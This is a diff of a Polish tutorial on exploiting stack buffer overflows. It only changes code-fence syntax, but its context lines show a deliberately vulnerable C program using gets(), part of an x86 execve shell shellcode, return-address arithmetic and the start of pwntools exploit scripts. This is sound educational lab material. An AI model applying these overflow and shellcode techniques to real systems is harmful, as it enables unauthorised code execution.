@@ -50,7 +50,7 @@ Przyjęte założenia podczas kompilacji:
 
 Poniżej znajduje się kod podatnej aplikacji. Podatność znajduje się w funkcji `vuln`, w której wywołujemy funkcję `gets()` - nie sprawdza ile bitów podajemy do zapisania i potrafi zapisać bity nawet poza długością przeznaczonego do tego buffora.
 
-```c=
+```c
 #include <stdio.h>
 #include <string.h>
 
@@ -85,7 +85,7 @@ Następnym krokiem jest odnalezienie adresu `buffer`. Adres jest stały, poniewa
 
 Shellcode można pobrać ze strony [shell-storm.org](http://shell-storm.org/shellcode/files/shellcode-752.php). W przypadku tego exploita używam shellcodu w postaci ASM, napisany dla architektury x86. Shellcode używa syscalla o numerze 11, czyli `execve`. Na stos wzurzamy również `/bin//sh`, który przypisujemy do rejestru ebx.
 
-```python=
+```python
 xor ecx, ecx
 mul ecx
 push ecx
@@ -99,7 +99,7 @@ int 0x80
 
 Ostatnim elementem potrzebnym do udanej eksploitacji to policzenie odpowiedniego adresu, na który należy wskazać, aby shellcode wykonał się. Do adresu buffora należy dodać długość paddingu oraz długość adresu powrotu.
 
-```python=
+```python
 padding = b"AAAABBBBCCCCDDDDEEEEFFFFGGGG"
 
 buf_ptr = 0xffffd1d0
@@ -110,7 +110,7 @@ eip = buf_ptr + len(padding) + 4
 Finalny exploit wygląda następująco:
 
 
-```python=
+```python
 #!/usr/bin/env python3
 
 from pwn import *
@@ -180,7 +180,7 @@ Przyjęte założenia podczas kompilacji:
 
 Kod podatnej aplikacji znajduje się poniżej. Tak jak w poprzedniej wersji, podatnością jest `gets()`. Zmienione zostały jedynie flagi kompilacji.
 
-```c=
+```c
 #include <stdio.h>
 #include <string.h>
 
@@ -235,7 +235,7 @@ Zatem finalny wysyłany payload jest postaci:
 
 Kod exploita:
 
-```python=
+```python
 #!/usr/bin/env python3
 
 from pwn import *
